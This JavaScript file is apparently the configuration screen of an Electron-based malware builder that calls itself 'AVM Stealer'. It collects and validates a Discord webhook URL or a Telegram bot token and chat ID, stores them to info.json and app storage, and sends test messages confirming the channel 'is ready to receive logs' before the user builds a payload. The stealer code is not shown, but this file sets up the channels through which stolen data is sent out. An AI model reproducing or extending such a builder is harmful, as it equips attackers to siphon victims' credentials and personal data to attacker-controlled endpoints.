const sidebar = document.querySelector('.sidebar');
const togglebtn = document.querySelector('.toggle-btn');
togglebtn.addEventListener('click', () => {
    sidebar.classList.toggle('active');
});
document.addEventListener('DOMContentLoaded', () => {
    const discordInput = document.getElementById('input1');
    const telegramTokenInput = document.getElementById('input2');
    const telegramChatIdInput = document.getElementById('input3');
    const testButton = document.getElementById('testButton');
    const saveButton = document.querySelector('label[for="input-file"]');
    const helpButton = document.getElementById('helpButton');
    const clearButton = document.getElementById('clearButton');
    const { ipcRenderer } = require('electron');
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.get('error') === 'missing_info') {
        setTimeout(() => {
            showNotification('Please provide and SAVE your Log Informations before building.', 'warning');
        }, 500);
    }
    async function loadSavedInfo() {
        try {
            const data = await ipcRenderer.invoke('get-info');
            if (data) {
                discordInput.value = data.discordWebhookURL || '';
                telegramTokenInput.value = data.telegramBotToken || '';
                telegramChatIdInput.value = data.telegramChatID || '';
                localStorage.setItem('discordWebhookURL', discordInput.value);
                localStorage.setItem('telegramBotToken', telegramTokenInput.value);
                localStorage.setItem('telegramChatID', telegramChatIdInput.value);
                updateInputStates();
            }
        } catch (error) {
            console.error('Failed to load saved info:', error);
        }
    }
    loadSavedInfo();
    async function sendTestEmbed(webhookURL) {
        const testEmbed = {
            title: '**Your Webhook Works Perfectly ✅**',
            author: {
                name: 'AVM Builder',
                icon_url: 'https://i.ibb.co/84zCWC73/icon.png'
            },
            color: 0x303037,
            footer: {
                text: 'AVM | Made by @WallGod69',
            },
        };
        try {
            await axios.post(webhookURL, { embeds: [testEmbed] });
            showNotification('Discord Webhook Test Message Sent Successfully!', 'success');
        } catch (error) {
            console.error('Failed to send test message to Discord Webhook.', error);
            if (error.response) {
                showNotification(`Failed to send test message to Discord Webhook.\nStatus: ${error.response.status}\nMessage: ${error.response.data}`, 'error');
            } else {
                showNotification('Failed to send test message to Discord Webhook.\nError: ' + error.message, 'error');
            }
        }
    }
    async function sendTestMessage(botToken, chatId) {
        const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
        const testMessage = {
            chat_id: chatId,
            text: 'Your Telegram Bot is ready to receive logs. ✅\n\n━━━━━━\nAVM Stealer',
            parse_mode: 'Markdown',
        };
        try {
            await axios.post(apiUrl, testMessage);
            showNotification('Telegram Bot Test Message Sent Successfully!', 'success');
        } catch (error) {
            console.error('Failed to send test message to Telegram Bot.', error);
            if (error.response) {
                showNotification(`Failed to send test message to Telegram Bot.\nStatus: ${error.response.status}\nMessage: ${error.response.data.description}`, 'error');
            } else {
                showNotification('Failed to send test message to Telegram Bot.\nError: ' + error.message, 'error');
            }
        }
    }
    function isValidDiscordWebhookURL(url) {
        const regex = /^https:\/\/discord\.com\/api\/webhooks\/\d+\/[\w-]{68}$/;
        return regex.test(url);
    }
    function isValidTelegramBotToken(token) {
        const regex = /^\d{9,12}:[\w-]{35}$/;
        return regex.test(token);
    }
    function isValidTelegramChatID(chatID) {
        const regex = /^-?\d+$/;
        return regex.test(chatID);
    }
    function updateInputStates() {
        const discordText = discordInput.value.trim();
        const telegramTokenText = telegramTokenInput.value.trim();
        const telegramChatIdText = telegramChatIdInput.value.trim();
        if (discordText) {
            telegramTokenInput.disabled = true;
            telegramChatIdInput.disabled = true;
            telegramTokenInput.classList.add('locked');
            telegramChatIdInput.classList.add('locked');
            discordInput.disabled = false;
            discordInput.classList.remove('locked');
        } else if (telegramTokenText || telegramChatIdText) {
            discordInput.disabled = true;
            discordInput.classList.add('locked');
            telegramTokenInput.disabled = false;
            telegramChatIdInput.disabled = false;
            telegramTokenInput.classList.remove('locked');
            telegramChatIdInput.classList.remove('locked');
        } else {
            discordInput.disabled = false;
            telegramTokenInput.disabled = false;
            telegramChatIdInput.disabled = false;
            discordInput.classList.remove('locked');
            telegramTokenInput.classList.remove('locked');
            telegramChatIdInput.classList.remove('locked');
        }
    }
    discordInput.addEventListener('input', updateInputStates);
    telegramTokenInput.addEventListener('input', updateInputStates);
    telegramChatIdInput.addEventListener('input', updateInputStates);
    function saveInfo() {
        const discordWebhookURL = discordInput.value.trim();
        const telegramBotToken = telegramTokenInput.value.trim();
        const telegramChatID = telegramChatIdInput.value.trim();
        if ((discordWebhookURL && isValidDiscordWebhookURL(discordWebhookURL)) ||
            (telegramBotToken && isValidTelegramBotToken(telegramBotToken) && telegramChatID && isValidTelegramChatID(telegramChatID))) {
            localStorage.setItem('discordWebhookURL', discordWebhookURL);
            localStorage.setItem('telegramBotToken', telegramBotToken);
            localStorage.setItem('telegramChatID', telegramChatID);
            const data = {
                discordWebhookURL: discordWebhookURL,
                telegramBotToken: telegramBotToken,
                telegramChatID: telegramChatID
            };
            const fs = require('fs');
            const path = require('path');
            fs.writeFile(path.join(__dirname, '..', 'info.json'), JSON.stringify(data, null, 2), (err) => {
                if (err) {
                    console.error('Failed to save info to JSON file.', err);
                } else {
                    console.log('Information saved to JSON file successfully!');
                }
            });
            ipcRenderer.invoke('save-info', data).then(() => {
                showNotification('Information saved successfully!', 'success');
            }).catch(err => {
                console.error('Failed to save to appdata:', err);
                showNotification('Failed to save settings to AppData.', 'error');
            });
        } else {
            showNotification('Please provide a valid Discord Webhook URL or valid Telegram Bot Token and Chat ID before saving.', 'error');
        }
    }
    saveButton.addEventListener('click', () => {
        saveInfo();
    });
    clearButton.addEventListener('click', async () => {
        discordInput.value = '';
        telegramTokenInput.value = '';
        telegramChatIdInput.value = '';
        localStorage.removeItem('discordWebhookURL');
        localStorage.removeItem('telegramBotToken');
        localStorage.removeItem('telegramChatID');
        updateInputStates();
        const data = {
            discordWebhookURL: '',
            telegramBotToken: '',
            telegramChatID: ''
        };
        try {
            await ipcRenderer.invoke('save-info', data);
            const fs = require('fs');
            const path = require('path');
            fs.writeFile(path.join(__dirname, '..', 'info.json'), JSON.stringify(data, null, 2), (err) => {
                if (err) console.error('Failed to clear info.json:', err);
            });
            showNotification('Information cleared successfully!', 'info');
        } catch (err) {
            console.error('Failed to clear info:', err);
            showNotification('Failed to clear settings.', 'error');
        }
    });
    testButton.addEventListener('click', () => {
        const discordWebhookURL = discordInput.value.trim();
        const telegramBotToken = telegramTokenInput.value.trim();
        const telegramChatID = telegramChatIdInput.value.trim();
        if (discordWebhookURL && isValidDiscordWebhookURL(discordWebhookURL)) {
            sendTestEmbed(discordWebhookURL);
        } else if (discordWebhookURL) {
            showNotification('Please provide a valid Discord Webhook URL.', 'error');
        }
        if (telegramBotToken && isValidTelegramBotToken(telegramBotToken) && telegramChatID && isValidTelegramChatID(telegramChatID)) {
            sendTestMessage(telegramBotToken, telegramChatID);
        } else if (telegramBotToken || telegramChatID) {
            showNotification('Please provide a valid Telegram Bot Token and Chat ID.', 'error');
        }
        if (!discordWebhookURL && (!telegramBotToken || !telegramChatID)) {
            showNotification('Please provide at least one valid webhook URL or bot token and chat ID.', 'warning');
        }
    });
    function showError(input, bubble) {
        bubble.classList.add('show');
        input.style.borderColor = '#ff4757';
        setTimeout(() => {
            bubble.classList.remove('show');
            input.style.borderColor = 'rgba(255, 255, 255, 0.1)';
            input.value = '';
            updateInputStates();
        }, 3000);
    }
    [discordInput, telegramTokenInput, telegramChatIdInput].forEach(input => {
        input.addEventListener('change', () => {
            const val = input.value.trim();
            if (val === '') return;
            const bubble = input.parentElement.querySelector('.error-bubble');
            let isValid = false;
            if (input === discordInput) {
                isValid = isValidDiscordWebhookURL(val);
            } else if (input === telegramTokenInput) {
                isValid = isValidTelegramBotToken(val);
            } else if (input === telegramChatIdInput) {
                isValid = isValidTelegramChatID(val);
            }
            if (!isValid) {
                showError(input, bubble);
            }
        });
    });
    updateInputStates();
});
function openHelp(type) {
    const urls = {
        discord: 'https://youtu.be/fKksxz2Gdnc?si=T3rRJJ-pR5o74zG1',
        telegramToken: 'https://t.me/BotFather',
        telegramChat: 'https://t.me/chatIDrobot'
    };
    const url = urls[type];
    if (url) {
        require('electron').shell.openExternal(url);
    }
}
function showHelpMessage() {
    showNotification('Click on the question mark icons (?) next to each input field for more information.', 'info');
}
document.getElementById('helpButton').addEventListener('click', showHelpMessage);
